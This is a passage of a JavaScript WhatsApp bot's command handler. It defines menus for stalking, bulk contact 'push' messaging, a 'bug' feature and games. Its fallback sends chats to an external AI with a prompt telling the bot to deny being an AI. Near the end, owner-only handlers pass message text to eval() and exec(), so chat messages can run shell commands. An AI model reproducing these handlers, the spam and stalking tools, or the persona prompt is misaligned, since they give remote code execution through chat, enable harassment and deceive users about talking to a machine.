│ ${setv} ${prefix}cerpen-mengharukan  
│ ${setv} ${prefix}cerpen-misteri  
│ ${setv} ${prefix}cerpen-motivasi  
│ ${setv} ${prefix}cerpen-nasihat  
│ ${setv} ${prefix}cerpen-nasionalisme  
│ ${setv} ${prefix}cerpen-olahraga  
│ ${setv} ${prefix}cerpen-patahhati  
│ ${setv} ${prefix}cerpen-penantian  
│ ${setv} ${prefix}cerpen-pendidikan  
│ ${setv} ${prefix}cerpen-pengalaman  
│ ${setv} ${prefix}cerpen-pengorbanan  
│ ${setv} ${prefix}cerpen-penyesalan  
│ ${setv} ${prefix}cerpen-perjuangan  
│ ${setv} ${prefix}cerpen-perpisahan  
│ ${setv} ${prefix}cerpen-persahabatan  
│ ${setv} ${prefix}cerpen-petualangan  
│ ${setv} ${prefix}cerpen-ramadhan  
│ ${setv} ${prefix}cerpen-remaja  
│ ${setv} ${prefix}cerpen-rindu  
│ ${setv} ${prefix}cerpen-rohani  
│ ${setv} ${prefix}cerpen-romantis  
│ ${setv} ${prefix}cerpen-sastra  
│ ${setv} ${prefix}cerpen-sedih  
│ ${setv} ${prefix}cerpen-sejarah  
╰─────┈➤`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break
            case 'toolsmenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*
 
╭─┴─┈➤「 *TOOLS* 」❍
│ ${setv} ${prefix}get (url)
│ ${setv} ${prefix}hd (reply pesan)
│ ${setv} ${prefix}toaudio (reply pesan)
│ ${setv} ${prefix}tomp3 (reply pesan)
│ ${setv} ${prefix}tovn (reply pesan)
│ ${setv} ${prefix}toimage (reply pesan)
│ ${setv} ${prefix}toptv (reply pesan)
│ ${setv} ${prefix}tourl (reply pesan)
│ ${setv} ${prefix}tts (textnya)
│ ${setv} ${prefix}toqr (textnya)
│ ${setv} ${prefix}ssweb (url)
│ ${setv} ${prefix}enc
│ ${setv} ${prefix}githubtrend 
│ ${setv} ${prefix}sticker (send/reply img)
│ ${setv} ${prefix}breatanime (teks)
│ ${setv} ${prefix}brat (teks)
│ ${setv} ${prefix}bratvid (teks)
│ ${setv} ${prefix}colong (reply stiker)
│ ${setv} ${prefix}smeme (send/reply img)
│ ${setv} ${prefix}emojimix 🙃+💀
│ ${setv} ${prefix}nulis
│ ${setv} ${prefix}readmore text1|text2
│ ${setv} ${prefix}qc (pesannya)
│ ${setv} ${prefix}translate
│ ${setv} ${prefix}wasted (send/reply img)
│ ${setv} ${prefix}triggered (send/reply img)
│ ${setv} ${prefix}shorturl (urlnya)
│ ${setv} ${prefix}gitclone (urlnya)
│ ${setv} ${prefix}fat (reply audio)
│ ${setv} ${prefix}fast (reply audio)
│ ${setv} ${prefix}bass (reply audio)
│ ${setv} ${prefix}slow (reply audio)
│ ${setv} ${prefix}tupai (reply audio)
│ ${setv} ${prefix}deep (reply audio)
│ ${setv} ${prefix}robot (reply audio)
│ ${setv} ${prefix}blown (reply audio)
│ ${setv} ${prefix}reverse (reply audio)
│ ${setv} ${prefix}smooth (reply audio)
│ ${setv} ${prefix}earrape (reply audio)
│ ${setv} ${prefix}nightcore (reply audio)
│ ${setv} ${prefix}getexif (reply sticker)
╰─────┈➤`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break
case 'stalkmenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*
 
╭──┈➤「 *Stalk* 」❍ 
│ ${setv} ${prefix}ffstalk
│ ${setv} ${prefix}mlstalk
│ ${setv} ${prefix}igstalk
│ ${setv} ${prefix}ytstalk
│ ${setv} ${prefix}genshinstalk
│ ${setv} ${prefix}twiterstalk
│ ${setv} ${prefix}telestalk
│ ${setv} ${prefix}bankstalk
│ ${setv} ${prefix}ghstalk
│ ${setv} ${prefix}chwastalk
│ ${setv} ${prefix}ytstalk
│ ${setv} ${prefix}bandlabstalk
│ ${setv} ${prefix}minicraftstalk
│ ${setv} ${prefix}steamstalk
│ ${setv} ${prefix}xboxstalk
╰─────┈➤
 `
                let buttons = [{
                    buttonId: ".menu",
                    buttonText: {
                        displayText: "Back To Menu"
                    },
                    type: 1
                }]

                // Kirim gambar lokal + teks + tombol
                await Xlesy.sendButtonMsg(m.chat, {
                    image: {
                        url: imagePath
                    }, // Menggunakan file lokal
                    text: textMessage,
                    footer: 'XLESYVIP',
                    buttons: buttons
                }, {
                    quoted: ftroli
                })               
            }
            break
            case 'aimenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*
 
  ╭──┈➤「 *AI* 」❍ 
  │ ${setv} ${prefix}autoaixlesy  
  │ ${setv} ${prefix}ai (query) 
  │ ${setv} ${prefix}Xlesy (query)
  │ ${setv} ${prefix}simi (query) 
  │ ${setv} ${prefix}txt2img (query) 
  │ ${setv} ${prefix}aigen
  ╰─────┈➤
 `
                let buttons = [{
                    buttonId: ".menu",
                    buttonText: {
                        displayText: "Back To Menu"
                    },
                    type: 1
                }]

                // Kirim gambar lokal + teks + tombol
                await Xlesy.sendButtonMsg(m.chat, {
                    image: {
                        url: imagePath
                    }, // Menggunakan file lokal
                    text: textMessage,
                    footer: 'XLESYVIP',
                    buttons: buttons
                }, {
                    quoted: ftroli
                })               
            }
            break
            case 'animemenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*
 
╭───┈➤「 *ANIME MENU* 」❍  
│ ${setv} ${prefix}waifu  
│ ${setv} ${prefix}neko  
│ ${setv} ${prefix}animeawoo  
│ ${setv} ${prefix}animemegumin  
│ ${setv} ${prefix}animeshinobu  
│ ${setv} ${prefix}animehandhold  
│ ${setv} ${prefix}animehighfive  
│ ${setv} ${prefix}animecringe  
│ ${setv} ${prefix}animedance  
│ ${setv} ${prefix}animehappy  
│ ${setv} ${prefix}animeglomp  
│ ${setv} ${prefix}animesmug  
│ ${setv} ${prefix}animeblush  
│ ${setv} ${prefix}animewave  
│ ${setv} ${prefix}animesmile  
│ ${setv} ${prefix}animepoke  
│ ${setv} ${prefix}animewink  
│ ${setv} ${prefix}animebonk  
│ ${setv} ${prefix}animebully  
│ ${setv} ${prefix}animeyeet  
│ ${setv} ${prefix}animebite  
│ ${setv} ${prefix}animelick  
│ ${setv} ${prefix}animekill  
│ ${setv} ${prefix}animecry  
│ ${setv} ${prefix}animewlp  
│ ${setv} ${prefix}animekiss  
│ ${setv} ${prefix}animehug  
│ ${setv} ${prefix}couplepp  
│ ${setv} ${prefix}animeneko  
│ ${setv} ${prefix}animepat  
│ ${setv} ${prefix}animeslap  
│ ${setv} ${prefix}animecuddle  
│ ${setv} ${prefix}animewaifu  
│ ${setv} ${prefix}animenom  
│ ${setv} ${prefix}animefoxgirl  
│ ${setv} ${prefix}animetickle  
│ ${setv} ${prefix}animegecg  
│ ${setv} ${prefix}dogwoof  
│ ${setv} ${prefix}8ballpool  
│ ${setv} ${prefix}goosebird  
│ ${setv} ${prefix}animefeed  
│ ${setv} ${prefix}animeavatar  
│ ${setv} ${prefix}lizardpic  
│ ${setv} ${prefix}catmeow  
╰─────┈➤`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break
            case 'gamemenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*

╭──┈➤「 *GAME* 」❍
│ ${setv} ${prefix}tictactoe
│ ${setv} ${prefix}akinator
│ ${setv} ${prefix}suit
│ ${setv} ${prefix}slot
│ ${setv} ${prefix}math (level)
│ ${setv} ${prefix}begal
│ ${setv} ${prefix}casino (nominal)
│ ${setv} ${prefix}rampok (@tag)
│ ${setv} ${prefix}tekateki
│ ${setv} ${prefix}tebaklirik
│ ${setv} ${prefix}tebakkata
│ ${setv} ${prefix}tebakbom
│ ${setv} ${prefix}susunkata
│ ${setv} ${prefix}tebakkimia
│ ${setv} ${prefix}caklontong
│ ${setv} ${prefix}tebaknegara
│ ${setv} ${prefix}tebakgambar
│ ${setv} ${prefix}tebakbendera
╰─────┈➤`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break
            case 'funmenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*
 
╭──┈➤「 *FUN* 」❍
│ ${setv} ${prefix}dadu
│ ${setv} ${prefix}bisakah (text)
│ ${setv} ${prefix}apakah (text)
│ ${setv} ${prefix}kapan (text)
│ ${setv} ${prefix}kerangajaib (text)
│ ${setv} ${prefix}cekmati (nama lu)
│ ${setv} ${prefix}ceksifat
│ ${setv} ${prefix}cekkhodam (nama lu)
│ ${setv} ${prefix}rate (reply pesan)
│ ${setv} ${prefix}jodohku
│ ${setv} ${prefix}jadian
│ ${setv} ${prefix}fitnah
│ ${setv} ${prefix}halah (text)
│ ${setv} ${prefix}hilih (text)
│ ${setv} ${prefix}huluh (text)
│ ${setv} ${prefix}heleh (text)
│ ${setv} ${prefix}holoh (text)
╰─────┈➤`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break
            case 'randomenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*
  
╭─┴─┈➤「 *RANDOM MENU* 」❍  
│ ${setv} ${prefix}coffe  
│ ${setv} ${prefix}bluearchive
│ ${setv} ${prefix}cecanindo  
│ ${setv} ${prefix}cecancina
│ ${setv} ${prefix}cecanjapan 
│ ${setv} ${prefix}cecankorea
│ ${setv} ${prefix}cecantahiland 
│ ${setv} ${prefix}kucing 
╰─────┈➤`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break

            break
            case 'pushmenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*

╭──┈➤「 *PUSH MENU* 」❍
│ ${setv} ${prefix}pushkontak
│ ${setv} ${prefix}pushkontak1  
│ ${setv} ${prefix}pushkontakid
│ ${setv} ${prefix}jpm
│ ${setv} ${prefix}setteksjpm
│ ${setv} ${prefix}teksjpm    
│ ${setv} ${prefix}svcontact (nama kontak)
╰─────┈➤
    `;

                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break
            case 'ownermenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*

╭──┈➤「 *OWNER MENU* 」❍
│ ${setv} ${prefix}bot [set]
│ ${setv} ${prefix}done
│ ${setv} ${prefix}setbio
│ ${setv} ${prefix}setppbot
│ ${setv} ${prefix}join
│ ${setv} ${prefix}leave
│ ${setv} ${prefix}leaveid
│ ${setv} ${prefix}block
│ ${setv} ${prefix}listblock
│ ${setv} ${prefix}openblock
│ ${setv} ${prefix}listpc
│ ${setv} ${prefix}listgcbot
│ ${setv} ${prefix}listgc
│ ${setv} ${prefix}replay (pesannya)
│ ${setv} ${prefix}replay1 (pesannya)
│ ${setv} ${prefix}notif
│ ${setv} ${prefix}creategc
│ ${setv} ${prefix}addprem
│ ${setv} ${prefix}delprem
│ ${setv} ${prefix}listprem
│ ${setv} ${prefix}addlimit
│ ${setv} ${prefix}adduang
│ ${setv} ${prefix}bot --settings
│ ${setv} ${prefix}bot settings
│ ${setv} ${prefix}restartbot
│ ${setv} ${prefix}getsession
│ ${setv} ${prefix}delsession
│ ${setv} ${prefix}delsampah
│ ${setv} ${prefix}upsw
╰─────┈➤`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break

case 'menu': {
    await Xlesy.sendMessage(m.chat, {
        react: {
            text: '⏳',
            key: m.key
        }
    });

    let imagePath = './lib/media/image/menu1.jpg';
    let audioPath = './lib/media/audio/menu.opus';
    const media = await prepareWAMessageMedia({
        image: { url: imagePath }
    }, {
        upload: Xlesy.waUploadToServer
    });

    let menunya = `Hey *${m.pushName ? m.pushName : 'Unknown'}!* ${ucapanWaktu}
Selamat Datang di *\`XLESYVIP\`* A bot Assistant That Is Ready To Help With Anything On The Menu.

*╭── ⧼ \`XLESYVIP\` ⧽*
*│ 々 OwnerName :* ${author}
*│ 々 OwnerNumber :* ${owner}
*│ 々 BotName :* ${botname}
*│ 々 VersiOn  :* ${require('./package.json').version}
*│ 々 TypeSc  :* Cjs
*│ 々 Runtime  :* ${runtime(process.uptime())}
*╰────────────────⧽*

*╭───⧼ \`List Menu\`⧽*
*│*  々 Allmenu
*│*  々 Menu Bot
*│*  々 Menu Group
*│*  々 Menu Search
*│*  々 Menu Download
*│*  々 Menu Push
*│*  々 Menu Quotea
*│*  々 Menu Library
*│*  々 Menu Tools
*│*  々 Menu Stalk
*│*  々 Menu Ai
*│*  々 Menu Game
*│*  々 Menu Funn
*│*  々 Menu Anime
*│*  々 Menu Music
*│*  々 Menu Randm
*│*  々 Menu Owner
*│*  々 Menu Bug
*╰────────────────⧽*

⧼ Click \`XlesyMenu\` Below ⧽`;

    const buttons = {
        buttonsMessage: {
            contentText: menunya,
            footerText: `グキエン`,
            buttons: [
                {
                    buttonId: ".owner",
                    buttonText: { displayText: "Owner" },
                    type: 1,
                },
                {
                    buttonId: ".ping",
                    buttonText: { displayText: "Server" },
                    type: 1,
                },
                {
                    buttonId: ".example3",
                    buttonText: { displayText: "📜 List Menu" },
                    type: 2,
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({
                            title: "XlesyMenu",
                            sections: [
                                {
                                    title: "List Menu Yang Sering Dipakai",
                                    highlight_label: "Populer",
                                    rows: [
                                        {
                                            id: ".allmenu",
                                            title: "All Menu",
                                            description: "Menampilkan Semua Menu"
                                        }
                                    ]
                                },
                                {
                                    title: "List Menu Yang Terpisah",
                                    rows: [
                                        { id: ".botmenu", title: "Bot Menu", description: "Menampilkan Menu Bot" },
                                        { id: ".groupmenu", title: "Group Menu", description: "Menampilkan Menu Group" },
                                        { id: ".searchmenu", title: "Search Menu", description: "Menampilkan Menu Pencarian" },
                                        { id: ".downloadmenu", title: "Download Menu", description: "Menampilkan Menu Download" },
                                        { id: ".pushmenu", title: "Push Menu", description: "Menampilkan Menu Push" },
                                        { id: ".quotesmenu", title: "Quotes Menu", description: "Menampilkan Menu Quotes" },
                                        { id: ".librarymenu", title: "Library Menu", description: "Menampilkan Menu Library" },
                                        { id: ".toolsmenu", title: "Tools Menu", description: "Menampilkan Menu Alat" },
                                        { id: ".stalkmenu", title: "Stalk Menu", description: "Menampilkan Menu Stalkt" },
                                        { id: ".aimenu", title: "AI Menu", description: "Menampilkan Menu AI" },
                                        { id: ".gamemenu", title: "Game Menu", description: "Menampilkan Menu Game" },
                                        { id: ".funmenu", title: "Fun Menu", description: "Menampilkan Menu Hiburan" },
                                        { id: ".animemenu", title: "Anime Menu", description: "Menampilkan Menu Anime" },
                                        { id: ".musicmenu", title: "Music Menu", description: "Menampilkan Menu Audio" },
                                        { id: ".randommenu", title: "Random Menu", description: "Menampilkan Menu Acak" },
                                        { id: ".ownermenu", title: "Owner Menu", description: "Menampilkan Menu Owner" }
                                    ]
                                },
                                {
                                    title: "List Menu Bug XlesyVIP",
                                    highlight_label: "Tahap Pengembangan",
                                    rows: [
                                        {
                                            id: ".xlesybug",
                                            title: "🎀 BUG XLESYVIP",
                                            description: "Menampilkan Menu BUG XlesyVIP"
                                        }
                                    ]
                                },
                                {
                                    title: "Documentasi Bot",
                                    rows: [
                                        { id: ".script", title: " Script", description: "Menampilkan Information Script" },
                                        { id: ".ping", title: " Information Bot", description: "Menampilkan Information Bot" }
                                    ]
                                }
                            ]
                        })
                    }
                }
            ],
            headerType: 4,
            imageMessage: media.imageMessage,
            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: my.ch,
                    newsletterName: `スクリプト更新情報`
                },                
						externalAdReply: {
							title: "XLESYVIP",
							body: author,
							showAdAttribution: true,
							thumbnailUrl: fake.gandathumburl,                                            						
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: false,
							mediaUrl: my.yt,
							sourceUrl: my.yt,
						}
        }
    }
            
        }
    

    const generatedMessage = await generateWAMessageFromContent(
        m.chat,
        buttons,
        {
            userJid: m.sender,
            quoted: ftroli
        }
    );

    await Xlesy.relayMessage(m.chat, generatedMessage.message, {
        additionalNodes: [
            {
                tag: "biz",
                attrs: {},
                content: [
                    {
                        tag: "interactive",
                        attrs: { type: "native_flow", v: "1" },
                        content: [
                            {
                                tag: "native_flow",
                                attrs: { name: "quick_reply" }
                            }
                        ],
                    }
                ],
            }
        ],
    });

    setTimeout(async () => {
        await Xlesy.sendMessage(m.chat, {
            audio: { url: audioPath },
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: fkontak1 });
    }, 1000);

    await Xlesy.sendMessage(m.chat, {
        react: {
            text: '✅',
            key: m.key
        }
    });
}
break;
            default:
          // autoai
if (global.globalAutoAIStatus) {
    if (m.sender === botNumber) return;

    // Tambahan: Jangan balas kalau dari saluran/channel
    if (m.chat.endsWith('@broadcast') || m.chat.endsWith('@channel')) return;

    const ignoredPrefixes = ['.', '#', '!', '/', '\\/'];
    if (ignoredPrefixes.some(prefix => m.text.startsWith(prefix))) return;
    if (!m.text) return;

    const chatId = m.chat;
    if (!sessions[chatId]) {
        sessions[chatId] = { messages: [] };
    }
    const prompt = `
Halo ${m.pushName} 👋, perkenalkan nama saya Gxyenn. Namamu pasti ${m.pushName}, bukan? ✨  
Nama kamu adalah Xlesy, AI yang santai, ramah, dan suka ngobrol dengan pengguna. Kamu hanya menjawab kalau pesan bukan perintah.  
Gunakan gaya bahasa santai dan sedikit humoris. Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu.

📌 *Aturan Main Xlesy:*  
- Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol.  
- Gunakan bahasa yang santai, tapi tetap sopan.  
- Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol.  
- Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!".

Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan!  
Dan jangan lupa, nama Dev/pembuat kamu adalah Gxyenn!
`;

    sessions[chatId].messages.push({ user: m.text });
    saveSession();

    try {
        const requestData = { 
            content: m.text, 
            user: m.sender, 
            prompt 
        };

        const axios = require('axios');
        const response = await axios.post('https://luminai.my.id', requestData);

        sessions[chatId].messages.push({ bot: response.data.result });
        saveSession();

        return Replyx(response.data.result);
    } catch (err) {
        console.error(err);
        return Replyx("⚠️ *Terjadi kesalahan, coba lagi nanti!*");
    }
}   
//END
            if ((budy.match) && ["anjing", "anying", "anj", "puqi", "kon", "kont", "kntl", "tolol", "tll", "pler", "woy", "mek", "jawir", "anj", "suki", "yaudah", "titit", "anjay", "mmk", "asu", "Ajg", "ajg", "kontol", "Kontol", "puki", "Puki", "yatim", "Yatim", "memek", "Memek", "asu", "Asu", "ngtd", "Ngtd"].includes(budy)) {
Xlesy.sendMessage(m.chat, { audio: fs.readFileSync('./lib/media/audio/toxic.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: fkontak1 })
}
                if (budy.startsWith('>')) {
                    if (!isCreator) return
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }
                if (budy.startsWith('<')) {
                    if (!isCreator) return
                    try {
                        let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return
                    if (!text) return
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(`${err}`)
                        if (stdout) return m.reply(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(err);
        // Replyx('*❗ Internal server error️*');		        
        Xlesy.sendFromOwner(DevGxyenn, `Halo Devolper, sepertinya ada yang error nih, jangan lupa diperbaiki ya\n\nVersion : *${require('./package.json').version}*\n\n*Log error:*\n\n` + util.format(err), m, {
            contextInfo: {
                isForwarded: true
            }
        })
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
});